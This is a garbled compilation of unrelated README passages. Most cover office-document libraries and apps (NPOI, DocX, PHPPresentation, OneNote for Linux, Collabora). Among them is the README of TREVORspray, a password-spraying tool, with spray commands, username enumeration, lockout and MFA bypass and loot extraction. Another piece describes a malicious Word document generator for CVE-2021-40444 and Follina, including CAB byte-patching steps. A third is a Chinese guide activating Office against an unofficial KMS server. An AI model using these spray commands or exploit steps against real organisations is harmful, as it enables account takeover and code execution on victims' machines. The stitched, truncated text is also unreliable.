```

## How can it work on Linux?

    ```

  - Debian

    ```
    FROM microsoft/dotnet:2.1-aspnetcore-runtime
    RUN apt-get update && apt-get install -y libgdiplus libc6-dev && ln -s /usr/lib/libgdiplus.so /usr/lib/gdiplus.dll
    ...
    ```

## Getting Started

### Export Excel

```csharp
var newFile = @""newbook.core.xlsx"";

using (var fs = new FileStream(newFile, FileMode.Create, FileAccess.Write)) {

    IWorkbook workbook = new XSSFWorkbook();

    ISheet sheet1 = workbook.CreateSheet(""Sheet1"");

    sheet1.AddMergedRegion(new CellRangeAddress(0, 0, 0, 10));
    var rowIndex = 0;
    IRow row = sheet1.CreateRow(rowIndex);
    row.Height = 30 * 80;
    row.CreateCell(0).SetCellValue(""this is content"");
    sheet1.AutoSizeColumn(0);
    rowIndex++;

    var sheet2 = workbook.CreateSheet(""Sheet2"");
    var style1 = workbook.CreateCellStyle();
    style1.FillForegroundColor = HSSFColor.Blue.Index2;
    style1.FillPattern = FillPattern.SolidForeground;

    var style2 = workbook.CreateCellStyle();
    style2.FillForegroundColor = HSSFColor.Yellow.Index2;
    style2.FillPattern = FillPattern.SolidForeground;

    var cell2 = sheet2.CreateRow(0).CreateCell(0);
    cell2.CellStyle = style1;
    cell2.SetCellValue(0);

    cell2 = sheet2.CreateRow(1).CreateCell(0);
    cell2.CellStyle = style2;
    cell2.SetCellValue(1);

    workbook.Write(fs);
}
```

### Export Word

```csharp

# 📚 P3X OneNote Linux v2023.10.243



**Bugs are evident™ - MATRIX️**
    





# Description

                        
[//]: #@corifeus-header:end

A Linux compatible version of OneNote

![Screenshot 1](https://cdn.corifeus.com/git/onenote/artifacts/screenshot/screenshot-2023.png)


# Main Features

P3X OneNote Linux is, actually, an independent browser window for the online OneNote. You can use this program without having to clutter your browser. The main functions are:
* that is independent from any browser, as it works in it's own process
* it provides a tray, that allows you to close your browser while it keeps running in the tray
* the data is cached and is faster than always opening a new window
* it allows you to sign in with the corporate or the personal login
* when there is a new update, it auto updates itself
* the program allows to use other Microsoft online applications, but the dedicated purpose is to use OneNote

## Verbose feature info

* Dark mode is enabled (but it is a hack, not supported by Microsoft, so quirky)
* To show the menu, click ALT
* Desktop menu
* You can use the `--minimized` argument to start the app with minimized window
* You can zoom the window
* Icon
* There is a bottom bar
    * It shows the current location
    * When you click on this bar, the location URL is copied into the clipboard
* There is a new button on the Edit menu
    * Copy this location to the clipboard
        * This is the same function that is on the bottom bar when you click on it
* Restart button (empty your cache, you can login again if there is an error)
* Remember last notebook (as much Online Onenote allows ...)
* Menu > Settings
    * Close to the tray
        * If checked, will minimize to the tray instead of quit
        * If un-checked, default quit close button behaviour (quit the app)
* You are able to set a proxy in the settings menu.
* There is now a menu called `Corporate home`
    * Given, I do not have a `Corporate` login, I cannot debug it at all.
        * If something is not working, the only way is to provide your login and I could probably fix it. Otherwise, I see nothing.
* The OneNote language is controlled by Microsoft, and we try to work with Online OneNote, but we are getting a hard time, but the Electron UI is now able to use any language.
    * You can translate any language @
        * https://github.com/patrikx3/onenote/tree/master/src/translation
* Allows using multiple instances (with some quirks, as the config will not be synchronized using multiple instances at once, so it can provide wrong results - to make it to work, configure with 1 instance, exit, then use multiple instances).
    * Multiple instances is not recommended (it was requested and provided).

# Downloadable installer

## Windows
It was a request to build a Windows version. [Issue 168](https://github.com/patrikx3/onenote/issues/169)

## Snap


[![LINK](https://snapcraft.io/static/images/badges/en/snap-store-black.svg)](https://snapcraft.io/p3x-onenote#cory-non-external)

## AppImage, deb, rpm

https://github.com/patrikx3/onenote/releases
  
AppImage, dep and rpm auto update itself.  
    
#### To integrate into the menu in AppImage
Execute:
```bash
sudo add-apt-repository ppa:appimagelauncher-team/stable
sudo apt-get update
sudo apt-get install appimagelauncher
```

#### After downloading the ```AppImage```, make it an executable.
```bash
mkdir -p $HOME/opt
mv ~/Downloads/p3x-onenote-a.b.c-x86_64.AppImage $HOME/opt/
chmod +x $HOME/opt/p3x-onenote-a.b.c-x86_64.AppImage
# Then you can run it
$HOME/opt/p3x-onenote-a.b.c-x86_64.AppImage &
```

<!--
It then actually integrates itself into the menus and it will auto update itself.

(The GitHub versions are always instant, while the ElectronJs Apps releases are delayed.)    
-->
  
The app can be found on [ElectronJs Apps](https://electronjs.org/apps) and search for `P3X`, you will find it.

[Change log](change-log.md)


<!--

If you want to install it on NodeJs instead of the AppImage, it is deprecated, but available [here](https://github.com/patrikx3/onenote/blob/c78e77c540e21b89e0e063cd50a10707faae722e/README.md#cli-install)

## Important Note

Check the ```Keep me signed in``` checkbox when entering your password then choose any page (but not a notebook) after logging in. This will keep you logged in.


**Do not install this app using the Command Line Interface (CLI) as it is deprecated**

The ```CLI``` installation does not always work due the updating of Linux distros.  Is is possible the ```configstore``` only works with ```sudo```, so use the ```released``` ```AppImage``` instead!

Installation of ```NodeJs``` is not necessary since the ```AppImage``` includes all dependencies.

```bash
# If this weird NPM error is encountered, do the following:
node -v
# make sure the node version is above 8.9.0
sudo npm install -g p3x-onenote --unsafe-perm=true --allow-root
p3x-onenote
```

Logout and relogin, and a menu will now appear.
-->

## If you are a NodeJs Ninja

[You want to install via NPM...](artifacts/npm.md)

<!--

# Issues

#### Corporate login
The corporate login is unstable, either it works or not. Only the personal account that I can provide some minimal support.

#### Suspend/Sleep/Wake up
I recognized, that after suspend/sleep and then wake up, the app is not saving the pages anymore. For now, the solution is, that after wake up, restart the app.

#### Not working on SNAP on some versions
Usually, on stable distros are working with SNAP, but usually non stable Linux distros could not work. Please, try using the `AppImage`, that is usually better than SNAP.

#### Error in auto-updater: Redirect was cancelled
Sometimes, you get an `AppImage` error for update, just download the latest release and replace the `AppImage` from here:  
https://github.com/patrikx3/onenote/releases

#### Rasberry and ARM is experimental
I have no ARM computer to test it out, I could build `AppImage` on ARM, but I have no idea if has an error, it crashes or it works.

#### Tray issues
It is possible, that the tray is not working, it is an upstream issue!

#### Not loading the pages / freezes
Sometimes, it is possible, that OneNote Online does not load properly or freezes, the solutions is to quit and start the program again. (I know, you won't like it at all! 😡) 


## Unable to log in

This only happens if you kill ```P3X OneNote Linux``` and then relogin many times. So, If the program needs to be killed often, ```sign out``` (on the top right of the Electron browser frame) just to be safe.

### BUT!

**Exiting using ```quit``` from the ```p3x-onenote``` menu or the tray, will prevent the problem.**


#### Online OneNote Change language

Although the main page's language can be changed, it reverts back when an actual page is accessed.
This is being investigated.

https://github.com/patrikx3/onenote/issues/14

#### Electron problem
🐞 Since Electron v3, the tray left click is executing as the right click, Electron bug.    
  
https://github.com/patrikx3/onenote/issues/38  

#### Fedora

https://github.com/patrikx3/onenote/issues/3#issuecomment-312711801
    
-->

# Development

For file names do not use camelCase, but use kebab-case. Folder should be named as kebab-case as well. As you can see, all code filenames are using it like that, please do not change that.
Please apply the `.editorconfig` settings in your IDE.

If you try to build the app with AppImage, you have to change from `electron` `dependencies` to `devDependencies`, this is because it is created to be able to run this app from `NPM` instead of an `AppImage`.

For generating `rpm` on `Ubuntu` distro, you can use:
```bash
sudo apt-get install rpm
```

xceedsoftware,DocX,,https://github.com/xceedsoftware/DocX,https://api.github.com/repos/DocX/xceedsoftware,Fast and easy to use .NET library that creates or modifies Microsoft Word files without installing Word.,"## What is DocX?

DocX is a .NET library that allows developers to manipulate Word 2007/2010/2013 files, in an easy and intuitive manner. DocX is fast, lightweight and best of all it does not require Microsoft Word or Office to be installed.

**NOTE:** There is a new Master branch as of Oct. 3, 2017. Please read about the [Classic branch](../../wiki/Classic-Branch) if you were using this project before the change.

DocX is the free, open source version of [Xceed Words for .NET](https://xceed.com/xceed-words-for-net). Originally written by Cathal Coffey, and maintained by Przemyslaw Klys, it is now maintained by Xceed. 
Starting at v1.5.0, this free and open source product is provided under the Xceed Community License agreement(for non-commercial use). 

Currently, the differences between DocX and Xceed Words for .NET, is that Xceed Words for .NET :
* can convert a Word document to PDF
* adds properties to wrap text around Pictures/Tables/Shapes
* adds Picture cropping
* adds Shapes (rectangles for now)
* adds TextBoxes or Shapes containing Text
* gets Shapes from Paragraphs
* gets Charts from Paragraphs and can modify their categories/values
* More properties in Charts configuration like axis Label position and series width
* is at least two versions ahead of the DocX version
* has professional technical support included in the subscription
* can automatically update fields from a document
* Insert html/rtf text (with tags), or html/rtf document, to a Word document
* Clone lists or tables
* Add or modify checkboxes
* Set transparency in pictures
* Create formatted hyperlinks based on a referenced hyperlinks
* Joining 2 documents gives the opportunity to choose the headers/footers of doc1, doc2 or both of them in the resulting document.
* Automatic hyphenations and configurable hyphenations
* Digital signatures can be added to documents in the .NET Framework environment
* Add footnotes and endnotes
* ListOptions for List level configurations
* Modify Chart's Series Marker and DataPoint styles
* Insert a document at a specific point in another document
* Wrap text around Charts
* Format Charts Axis' title

## What else do I need?

All that you need to install in order to use DocX is the [.NET framework 4.0](http://www.microsoft.com/downloads/en/details.aspx?FamilyID=9cfb2d51-5ff4-4491-b0e5-b386f32c0992&displaylang=en) or .NET5/6 and [Visual Studio 2010](http://www.microsoft.com/express/Downloads/) or later, both of which are free.

## Why would I use DocX?

DocX makes creating and manipulating documents a simple task. It does not use COM libraries nor does it require Microsoft Office to be installed. 

The following [blog post](http://cathalscorner.blogspot.com/2010/06/cathal-why-did-you-create-docx.html) from Cathal Coffey compares the code used to create a HelloWorld document using:
 1. Office Interop libraries, 
 2. OOXML SDK, 
 3. DocX

## Advanced Examples

 1. Step by step guide to create an invoice for a company. http://cathalscorner.blogspot.com/2009/08/docx-v1007-released.html
 2. Replace text across many documents in Parallel. http://cathalscorner.blogspot.com/2010/12/replace-text-across-many-documents-in.html
 3. Programmatically manipulate an Image imbedded inside a document. http://cathalscorner.blogspot.com/2010/12/programmatically-manipulate-image.html
 4. Converting DocX into (.doc, .pdf, .html) http://cathalscorner.blogspot.com/2009/10/converting-docx-into-doc-pdf-html.html

  * C++ based unit tests
* **cypress_test/**
  * JavaScript based integration tests

## Further recommended reading with build details

Please consult the README files in the component's directory for more details:
- **[wsd/README](wsd)**
- **[browser/README](browser)**

## iOS and Android apps

See the corresponding READMEs:
* **[ios/README](ios)**
* **[android/README](android)**

## GitPod

Head over to https://collaboraonline.github.io/post/build-code/ select gitpod from the dropdown and follow the steps.

Interesting things to keep in mind:
- Make sure your browser is not blocking windows/tabs from opening from the gitpod workspace URL (maybe add `*.gitpod.io` to your browser's whitelist)
  - The GitPod tasks will run automatically and further instructions will be printed out right in the terminal
  - VNC tab will open automatically if not just click in the left icon `Remote explorer` and click `6080`. You will see a tab completly black, that's normal.
  - As mentioned in those instructions if you are not using the VS Code desktop and if you are only relying on your browser please:
    - Do not try to click the URL from the make run out put instead copy that URL and execute `firefox [paste URL here]`
    - Head over to the tab where the VNC is opened (black page), you will see Firefox opening there, maximize and have fun.
    - You can also run cypress tests via GitPod but you will need to use Firefox, for that just prepend `CYPRESS_BROWSER=""firefox""` to the desired command. Example: `CYPRESS_BROWSER=""firefox"" make check` for every test or `CYPRESS_BROWSER=""firefox"" make check-desktop spec=impress/scrolling_spec.js` for one specific test on desktop

### Installation

#### Composer method

It is recommended that you install the PHPPresentation library [through composer](http://getcomposer.org/). To do so, add
the following lines to your ``composer.json``.

```json
{
    ""require"": {
       ""phpoffice/phppresentation"": ""dev-master""
    }
}
```

#### Manual download method

Alternatively, you can download the latest release from the [releases page](https://github.com/PHPOffice/PHPPresentation/releases).
In this case, you will have to register the autoloader.
(Register autoloading is required only if you do not use composer in your project.)

```php
require_once 'path/to/PhpPresentation/src/PhpPresentation/Autoloader.php';
\PhpOffice\PhpPresentation\Autoloader::register();
```

You will also need to download the latest PHPOffice/Common release from its [releases page](https://github.com/PHPOffice/Common/releases).
And you will also have to register its autoloader, too.

```php
require_once 'path/to/PhpOffice/Common/src/Common/Autoloader.php';
\PhpOffice\Common\Autoloader::register();
```

## Getting started

The following is a basic usage example of the PHPPresentation library.

```php
// with your own install
require_once 'src/PhpPresentation/Autoloader.php';
\PhpOffice\PhpPresentation\Autoloader::register();
require_once 'src/Common/Autoloader.php';
\PhpOffice\Common\Autoloader::register();

// with Composer
require_once 'vendor/autoload.php';

use PhpOffice\PhpPresentation\PhpPresentation;
use PhpOffice\PhpPresentation\IOFactory;
use PhpOffice\PhpPresentation\Style\Color;
use PhpOffice\PhpPresentation\Style\Alignment;

$objPHPPowerPoint = new PhpPresentation();

// Create slide
$currentSlide = $objPHPPowerPoint->getActiveSlide();

// Create a shape (drawing)
$shape = $currentSlide->createDrawingShape();
$shape->setName('PHPPresentation logo')
      ->setDescription('PHPPresentation logo')
      ->setPath('./resources/phppowerpoint_logo.gif')
      ->setHeight(36)
      ->setOffsetX(10)
      ->setOffsetY(10);
$shape->getShadow()->setVisible(true)
                   ->setDirection(45)
                   ->setDistance(10);

// Create a shape (text)
$shape = $currentSlide->createRichTextShape()
      ->setHeight(300)
      ->setWidth(600)
      ->setOffsetX(170)
      ->setOffsetY(180);
$shape->getActiveParagraph()->getAlignment()->setHorizontal( Alignment::HORIZONTAL_CENTER );
$textRun = $shape->createTextRun('Thank you for using PHPPresentation!');
$textRun->getFont()->setBold(true)
                   ->setSize(60)
                   ->setColor( new Color( 'FFE06B20' ) );

$oWriterPPTX = IOFactory::createWriter($objPHPPowerPoint, 'PowerPoint2007');
$oWriterPPTX->save(__DIR__ . ""/sample.pptx"");
$oWriterODP = IOFactory::createWriter($objPHPPowerPoint, 'ODPresentation');
$oWriterODP->save(__DIR__ . ""/sample.odp"");
```

More examples are provided in the [samples folder](samples/). You can also read the [Developers' Documentation](https://phpoffice.github.io/PHPPresentation/) and the [API Documentation](https://phpoffice.github.io/PHPPresentation/docs/) for more detail.

## Stargazers

[![Stargazers repo roster for @dream-num/univer](https://reporoster.com/stars/dream-num/univer)](https://github.com/dream-num/univer/stargazers)

## Architecture

Univer is written in typescript and designed according to the plug-in architecture. The functions outside the core are developed in the form of plug-ins. In the future, a plug-in market will be built to meet more personalized needs
![image](./docs/source/overall.png)

## Rendering engine

Univer sheet, document, and slide adopt the same rendering engine architecture, which abstracts the application into text flow, table, canvas, and core part triggers rendering, and object is the renderer.
![image](./docs/source/Render%20Engine.png)

1. Achieve the nesting and operation between applications.
2. Sheet cells support embedding doc text
3. Support inserting sheet, doc, slide in slide

|     slide 10-layer embedding      |         Sheet in slide and doc in cell         |   wrap text around a picture    |

### 激活说明
- KMS 激活有 180 天期限，此期限称为激活有效间隔
- 若要保持激活状态，您的系统必须通过至少每 180 天连接一次 KMS 服务器来续订激活
- 默认情况下，系统每 7 天自动进行一次激活续订尝试
- 在续订客户端激活之后，激活有效间隔重新开始
- 综上所述，只要您不超过 180 天以上无法连接互联网，系统会自行续期保持激活状态

----------
### Office（VOL 版本）激活步骤（管理员命令执行）
1. 进入安装目录 `cd ""C:\Program Files (x86)\Microsoft Office\Office16""`
    - 32 位默认一般为 `C:\Program Files (x86)\Microsoft Office\Office16`
    - 64 位默认一般为 `C:\Program Files\Microsoft Office\Office16`
    - **Office16** 是 **Office 2016**
    - **Office15** 是 **Office 2013**
    - **Office14** 是 **Office 2010**
    - 打开以上所说的目录，应该有个 `OSPP.VBS` 文件
2. 注册 KMS 服务 `cscript ospp.vbs /sethst:skms.netnr.eu.org`
3. 激活 Office `cscript ospp.vbs /act`

## 二、部署

### 1. 拉取代码
- 切换到`/projects`目录(没有就先新建目录`sudo mkdir /projects`)，执行命令`cd /projects`
- 执行命令`sudo git clone https://github.com/qzq1111/flask-restful-example.git`拉取代码
- 切换到`/projects/flask-restful-example`目录，执行命令`cd /projects/flask-restful-example`
       
### 2. 构建镜像
- 在当前目录`/projects/flask-restful-example`中构建镜像
- 执行命令`sudo docker build . -t=flask-restful-example:latest`构建，等待构建完成
- 执行命令`sudo docker images`，查询构建好的镜像`flask-restful-example`

### 3. 运行容器
- 在当前目录`/projects/flask-restful-example`中运行容器
- 执行命令`sudo docker-compose up -d`
- 执行命令`sudo docker ps`查询容器是否运行

### 4. 配置修改

#### 4.1 config/config.yaml配置
- SQLALCHEMY_DATABASE_URI：数据连接
- REDIS_HOST：Redis连接，此处如果使用的是docker-compose的link，修改为对应服务名称默认为`flask_redis`
    
#### 4.2 docker-compose配置
- image：构建的镜像名称
- container_name：启动之后容器名称
- ports：容器端口与宿主端口映射
- volumes：容器内部文件与宿主文件映射（持久化）
- links：链接的容器，容器之间使用服务名访问

#### 4.3 gun.conf配置
- bind：flask启动端口。一般不用修改，服务在容器内启动的。
- worker_class：flask启动的模式，有许多支持启动的方式，按需取舍。

#### 4.4 nginx配置
```
server {
        listen       5000;
        server_name  localhost;

        # api代理转发
        location /api {
            proxy_redirect  off;
            proxy_set_header    Host $host;
            proxy_set_header    X-Real-IP            $remote_addr;
            proxy_set_header    X-Forwarded-For      $proxy_add_x_forwarded_for;
            proxy_set_header    X-Forwarded-Proto    $scheme;
            proxy_pass http://127.0.0.1:3010/api;
        }
       # 报表下载
       location /report {
         alias /projects/flask-restful-example;
       }
    } 
```
### 5.备注
- 修改配置文件之后最好重启容器，`sudo docker-compose restart`
- 如果有任何问题可以加扣扣：`472597709`

  - custom modules (easy to make!)
- Tells you the status of each account: if it exists, is locked, has MFA enabled, etc.
- Automatic cancel/resume (remembers already-tried user/pass combos in `~/.trevorspray/tried_logins.txt`)
- Round-robin proxy through multiple IPs with `--ssh` or `--subnet`
- Automatic infinite reconnect/retry if a proxy goes down (or if you lose internet)
- Spoofs `User-Agent` and other signatures to look like legitimate auth traffic
- Comprehensive logging
- Optional `--delay`, `--jitter`, and `--lockout-delay` between requests to bypass lockout countermeasures
- IPv6 support
- O365 MFA bypass support (disable with `--no-loot`)
  - IMAP
  - SMTP
  - POP
  - EWS (Exchange Web Services) - Automatically retrieves GAL (Global Address Book)
  - EAS (Exchange ActiveSync)
    - Recommended bypass: BlueMail Android app
  - EXO (Exchange Online PowerShell)
  - UM (Exchange Unified Messaging)
  - AutoDiscover - Automatically retrieves OAB (Offline Address Book)
  - Azure Portal Access
- Domain `--recon` with the following features:
  - list MX/TXT records
  - list O365 info
    - tenant ID
    - tenant name
    - other tentant domains
    - sharepoint URL
    - authentication urls, autodiscover, federation config, etc.
  - User enumeration (use `--recon` and `--users`):
    - `OneDrive`
    - `Azure Seamless SSO`

## How To - O365
- First, get a list of emails for `corp.com` and perform a spray to see if the default configuration works. Usually it does.
- If TREVORspray says the emails in your list don't exist, don't give up. Get the `token_endpoint` with `--recon corp.com`. The `token_endpoint` is the URL you'll be spraying against (with the `--url` option).
- It may take some experimentation before you find the right combination of `token_endpoint` + email format.
    - For example, if you're attacking `corp.com`, it may not be as easy as spraying `corp.com`. You may find that Corp's parent company Evilcorp owns their Azure tenant, meaning that you need to spray against `evilcorp.com`'s `token_endpoint`. Also, you may find that `corp.com`'s internal domain `corp.local` is used instead of `corp.com`.
    - So in the end, instead of spraying `bob@corp.com` against `corp.com`'s `token_endpoint`, you're spraying `bob@corp.local` against `evilcorp.com`'s.

## Example: Perform recon against a domain (retrieves tenant info, autodiscover, mx records, etc.)
```bash
trevorspray --recon evilcorp.com
...
    ""token_endpoint"": ""https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token""
...
```

## Example: Enumerate users via OneDrive (no failed logins)
```bash
trevorspray --recon evilcorp.com -u emails.txt --threads 10
```

## Example: Spray against discovered ""token_endpoint"" URL
```bash
trevorspray -u emails.txt -p 'Welcome123' --url https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token
```

## Example: Spray with 5-second delay between requests
```bash
trevorspray -u bob@evilcorp.com -p 'Welcome123' --delay 5
```

## Example: Spray and round-robin between 3 IPs (the current IP is also used, unless `-n` is specified)
```bash
trevorspray -u emails.txt -p 'Welcome123' --ssh root@1.2.3.4 root@4.3.2.1
```

## Example: Find valid usernames without OSINT >:D
```bash
# clone wordsmith dataset
wget https://github.com/skahwah/wordsmith/releases/download/v2.1.1/data.tar.xz && tar -xvf data.tar.xz && cd data

# order first initial by occurrence
ordered_letters=asjmkdtclrebnghzpyivfowqux

# loop through first initials
echo -n $ordered_letters | while read -n1 f; do
  # loop through top 2000 USA last names
  head -n 2000 'usa/lnames.txt' | while read last; do
    # generate emails in f.last format
    echo ""${f}.${last}@evilcorp.com""
  done
done | tee f.last.txt

trevorspray -u f.last.txt -p 'Welcome123'
```

## Extract data from downloaded LZX files
When TREVORspray successfully bypasses MFA and retrieves an Offline Address Book (OAB), the address book is downloaded in LZX format to `~/.trevorspray/loot`. LZX is an ancient and obnoxious compression algorithm used by Microsoft.
~~~bash
# get libmspack (for extracting LZX file)
git clone https://github.com/kyz/libmspack
cd libmspack/libmspack/
./rebuild.sh
./configure
make

# extract LZX file
./examples/.libs/oabextract ~/.trevorspray/loot/deadbeef-ce01-4ec9-9d08-1050bdc41131-data-1.lzx oab.bin
# extract all strings
strings oab.bin
# extract and dedupe emails
egrep -oa '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}' oab.bin | tr '[:upper:]' '[:lower:]' | sort -u

## Writing your own Spray Modules
If you need to spray a service/endpoint that's not supported yet, you can write your own spray module! This is a great option because custom modules benefit from all of TREVORspray's features -- e.g. proxies, delay, jitter, etc.

Writing your own spray module is pretty straightforward. Create a new `.py` file in `lib/sprayers` (e.g. `lib/sprayers/custom_sprayer.py`), and create a class that inherits from `BaseSprayModule`. You can call the class whatever you want. Fill out the HTTP method and any other parameters that you need in the requests (you can reference `lib/sprayers/base.py` or any of the other modules for examples).
  - You only need to implement one method on your custom class: `check_response()`. This method evaluates the HTTP response to determine whether the login was successful.
  - Once you're finished, you can use the custom spray module by specifying the name of your python file (without the `.py`) on the command line, e.g. `trevorspray -m custom_sprayer -u users.txt -p Welcome123`.
~~~python
# Example spray module

from .base import BaseSprayModule

class SprayModule(BaseSprayModule):

    # HTTP method
    method = 'POST'
    # default target URL
    default_url = 'https://login.evilcorp.com/'
    # body of request
    request_data = 'user={username}&pass={password}&group={otherthing}'
    # HTTP headers
    headers = {}
    # HTTP cookies
    cookies = {}
    # Don't count nonexistent accounts as failed logons
    fail_nonexistent = False

    headers = {
        'User-Agent': 'Your Moms Smart Vibrator',
    }

    def initialize(self):
        '''
        Get additional arguments from user at runtime
        NOTE: These can also be passed via environment variables beginning with ""TREVOR_"":
            TREVOR_otherthing=asdf
        '''
        while not self.trevor.runtimeparams.get('otherthing', ''):
            self.trevor.runtimeparams.update({
                'otherthing': input(""What's that other thing? "")
            })

        return True


    def check_response(self, response):
        '''
        returns (valid, exists, locked, msg)
        '''

        valid = False
        exists = None
        locked = None
        msg = ''

        if getattr(response, 'status_code', 0) == 200:
            valid = True
            exists = True
            msg = 'Valid cred'

        return (valid, exists, locked, msg)

Malicious docx generator to exploit CVE-2021-40444 (Microsoft Office Word Remote Code Execution), works with arbitrary DLL files.

### Update 31/05/2022 - CVE-2022-30190 - Follina

Now the generator is able to generate the document required to exploit also the ""Follina"" attack (leveraging ms-msdt).

# Background

Although many PoC are already around the internet, I guessed to give myself a run to weaponizing this vulnerability,
as what I found available lacked valuable information that it's worth sharing, also considering Microsoft already
released a patch for this vulnerability.

So far, the only valuable resources I've seen to create a fully working generator are:
* [Blog by Ret2Pwn](https://xret2pwn.github.io//CVE-2021-40444-Analysis-and-Exploit/)
* [Twit by j00sean](https://twitter.com/j00sean/status/1437390861499838466)
* [Twit by wdormann](https://twitter.com/wdormann/status/1531250993127739392)

The above resources outline a lot of the requirements needed to create a full chain. To avoid repeating too much
unnecessary information, I'll just summarize the relevant details.

### Exploit Chain
1. Docx opened
2. Relationship stored in document.xml.rels points to malicious html
3. IE preview is launched to open the HTML link
4. JScript within the HTML contains an object pointing to a CAB file, and an iframe pointing to an INF file,
   prefixed with the "".cpl:"" directive
5. The cab file is opened, the INF file stored in the %TEMP%\Low directory
6. Due to a Path traversal (ZipSlip) vulnerability in the CAB, it's possible to store the INF in %TEMP%
7. Then, the INF file is opened with the "".cpl:"" directive, causing the side-loading of the INF file via rundll32 
  (if this is a DLL)

### Overlooked Requirements

There are quite a bit of overlooked requirements for this exploit to work, which caused even good PoCs, like
[the one by lockedbyte](https://github.com/lockedbyte/CVE-2021-40444), to fail working properly.

Maybe nobody explicitly ""released"" them to avoid the vulnerability to be exploited more. But now it's patched,
so it should not cause a lot of troubles to release the details.

#### HTML File

As for this [tweet](https://twitter.com/wdormann/status/1440036541112328199) by [Will Dormann](https://twitter.com/wdormann), 
the HTML should be at least 4096 bytes in size in order to trigger the ""Preview"" within MS Word. 

#### CAB File

The CAB file needs to be byte-patched to avoid extraction errors and to achieve the ZipSlip:
* `filename.inf` should become `../filename.inf`
* `filename.inf` ~~should be exactly <12-char>.inf~~ Not really true, the important bit is to modify `coffCabStart`
* `CFFOLDER.typeCompress` ~~should be 0 (not compressed)~~
* `CFFOLDER.coffCabStart` should be increased by 3 (due to the added '../'')
* `CFFOLDER.cCfData` ~~should be 2~~
* `CFFILE.cbFile` should be greater than the whole `CFHEADER.cbCabinet`
* `CFDATA.csum` ~~should be recalculated (or zeroed out)~~ [OPTIONAL]

The reason for these constraints are many, and I didn't spend enough time to deeply understand all of them, but 
let's see the most important:

* **TypeCompress**: ~~If the CAB is compressed, the trick to open it within an object file to trigger the INF write will fail~~ False, I managed to achieve the same result with a MSZIP compressed sample
* **CoffCabStart**: CoffCabStart gives the absolute position of the first CFDATA structure, as we added a '../', 
  we would need to increase this by 3 to point to the file (this is more like a guess)
* **cCfData**: ~~As there is only 1 file, we should have just 1 CFDATA, I'm not too sure why this has to be set to 2~~ Indeed, we can leave it as 1
* **cbFile**: Interestingly, if the CAB extraction concludes without any error, the INF file will be marked for deletion
  by WORD, ruining the exploit. The only way to prevent this is to make WORD believe the extraction failed. If the
  cbFile value is defined as greater than the cabinet file itself, the extractor will reach an EOF before reading
  all the bytes defined in cbFile, raising an extraction error.
* [OPTIONAL] This value seems to not be checked by MS Word. Anyway, to have a correct CAB, the **csum** value should be recalculated. Luckily, as noted by [j00sean](https://twitter.com/j00sean)
  and according to [MS documentation](http://download.microsoft.com/download/4/d/a/4da14f27-b4ef-4170-a6e6-5b1ef85b1baa/[ms-cab].pdf), 
  this value can be 0

**NOTE1**: Defender now detects if the CAB file contains a PE by using the `_IMAGE_DOS_HEADER.e_magic` value as a 
signature, potentially avoiding PE files to be embedded in the CAB. Can this signature be bypassed? 
I'm not sure but, as observed before, this is a patched vulnerability, so I'm not planning to invest much more time 
on this. Up to the curious reader to develop this further.

**NOTE2**: Microsoft Patch blocks arbitrary URI schemes, apparently using a blacklist approach (this is just a supposition)

# DLL Attack

The main attack chain associated with CVE-2021-40444 is the DLL attack loaded via the `.cpl` URI scheme. In order to 
exploit that, an attacker needs to generate a specially crafted DLL. If you want to test it out, try my [evildll-gen](https://gist.github.com/klezVirus/e24c94d7061f5736e2452eee022f4011)
script.

# JScript, VBScript, Javaw, MSIexec, ...

As noted by [Max Maluin](https://twitter.com/Max_Mal_), it is possible to interact with several filetypes abusing IE and 
the associated file extension based URI. While this is might be a good way to exploit IE, it has limitations.

Indeed, it should be noted that the method used in the exploit to download files is based on ActiveX control updates, 
and cannot be used to download arbitrary files.
As per Microsoft [documentation](https://docs.microsoft.com/it-it/cpp/mfc/upgrading-an-existing-activex-control?view=msvc-160), the `codebase` tag
can point just to a few filetypes: OCX, INF and CAB.

Even if we can directly download an OCX or INF file, we still can't be sure to download the file in the right location 
within the system. With the cab exploit, it is possible to move the `.inf` file in a well-known path using the path traversal,
but in any other case the file will be stored in a random directory, making it virtually impossible to reference it.

As of today, I didn't find a way to chain download and execution WITHOUT a CAB file.

Note: Talking about IE alone, HTML smuggling could be a possible scenario to exploit the vulnerability.

# Cab-less file attack using hybrid RAR file

This technique was firstly disclosed by [Eduardo Braun](https://twitter.com/Edu_Braun_0day) on Twitter and further explained in [this](https://github.com/Edubr2020/CVE-2021-40444--CABless/blob/main/MS_Windows_CVE-2021-40444%20-%20'Ext2Prot'%20Vulnerability%20'CABless'%20version.pdf) paper.

Please note that using this technique, the attack chain is a bit different. This attack requires the user to download 
a specially crafted RAR file, obtained by chaining a valid WSF script and a valid RAR file. Once opened, the RAR will contain 
a DOCX with a reference to an HTML, which in turn will try to load the RAR file as a WSF script.

To summarise:

1. Specially crafted RAR file is downloaded (likely Download folder)
2. DOCX extracted and opened
3. Relationship stored in document.xml.rels points to malicious html
4. IE preview is launched to open the HTML link
5. JScript within the HTML contains a script/iframe pointing to the RAR file, prefixed with the "".wsf:"" URI scheme
6. As the RAR was designed to be contemporaneously a valid RAR and a valid WSF script, the script is executed

# What are the exploits PoC implemented by the tool

The generator utility can currently reproduce the following attacks:

| Attack                                   | HTML Templates      | Target | Delivery Method | Execution Method | Working         |
|------------------------------------------|---------------------|--------|-----------------|------------------|-----------------|
| Original version of the attack           | cab-orig-*          | WORD   | DOCX            | CAB + DLL        | YES             |
| j00sean IE-only attack                   | cab-orig-j00san     | IE     | HTML            | CAB + DLL        | YES             |
| My version without DLL                   | cab-uri-*           | WORD   | DOCX            | CAB + JS/VBS     | NO<sup>1</sup>  |
| Eduardo B. ""CABless"" attack using RAR    | cabless-rar-*       | WORD   | RAR             | WSF              | YES             |
| Modified j00sean attack + HTML smuggling | cabless-smuggling-* | IE     | HTML            | JS/VBS           | YES<sup>2</sup> | 
| Follina attack                           | cabless-msdt-*      | WORD   | DOCX/RTF        | MSDT + PS        | YES<sup>3</sup> | 

_<sup>1</sup>The CAB is not downloaded properly in some environments_

_<sup>2</sup>The user needs to click on ""Save"" to download the file on IE_

_<sup>3</sup>Not really working on all Windows/MS Word versions_

# CAB file parser

The utility `cab_parser.py` can be used to see the headers of the exploit file, but don't consider this a full 
parser. It's a very quick and dirty CAB header viewer I developed to understand what was going on.

# Install

